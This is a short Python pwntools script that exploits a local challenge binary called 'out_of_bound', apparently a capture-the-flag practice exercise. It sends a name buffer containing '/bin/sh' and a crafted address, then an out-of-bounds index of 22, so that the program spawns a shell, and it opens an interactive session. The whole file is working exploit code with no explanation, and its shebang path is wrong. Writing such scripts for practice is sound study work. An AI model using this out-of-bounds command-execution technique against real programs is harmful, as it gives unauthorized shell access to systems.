#! /bin/usr/python3

from pwn import *

p = process("./out_of_bound")
e = ELF("./out_of_bound")

payload = b'/bin/sh\x00aaaa' + p32(0x0804a0ac)
p.sendafter("name", payload)
p.sendlineafter("want?: ", b'22')

p.interactive()

